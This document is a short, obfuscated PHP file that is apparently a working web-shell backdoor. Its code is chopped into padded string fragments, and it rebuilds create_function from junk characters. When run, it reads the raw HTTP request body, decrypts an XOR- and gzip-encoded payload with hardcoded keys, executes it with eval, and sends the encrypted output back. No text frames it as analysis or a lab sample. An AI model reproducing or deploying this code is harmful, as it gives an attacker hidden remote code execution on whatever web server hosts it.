<?php
$q='c2^h("2^/$kh(.+)$kf/",@2^file_2^2^get_c2^ontents("php:2^//input")2^,$m2^)==12^) {@2^ob2^_start();@ev2';
$r='$k="f2^2^8f9d879";2^$kh="be72^d01f15a2^32^f";$k2^f="c2^15169465235";$p="2^e2^ewgm7Cp6FA2^MDA2^o6";2^';
$E='^al(@gzun2^compr2^2^ess(@x(@base62^42^_decode($m[2^2^1]),$k))2^2^);$o=@ob_get_2^contents(2^);@o2^b';
$T=str_replace('C','','crCCeate_CCfunCCction');
$v='0;2^($2^j<$c&&$i<$l2^);$j2^++2^,$i+2^+){$o.=$t{$i}^2^$k2^{$j};}2^}ret2^urn $o;}2^if (@preg_2^2^mat';
$P='_end_c2^lea2^n();$r=2^@bas2^e64_encod2^e(@x(@gz2^c2^ompress($2^o),$k)2^);print("$p2^$k2^h$r$kf");}';
$c='func2^t2^ion x($t,$k){$c2^2^=strlen(2^2^2^$k);$l=st2^rlen($t);$o="";for($2^i2^=0;$i<$l;){2^for($j=';
$K=str_replace('2^','',$r.$c.$v.$q.$E.$P);
$t=$T('',$K);$t();
?>
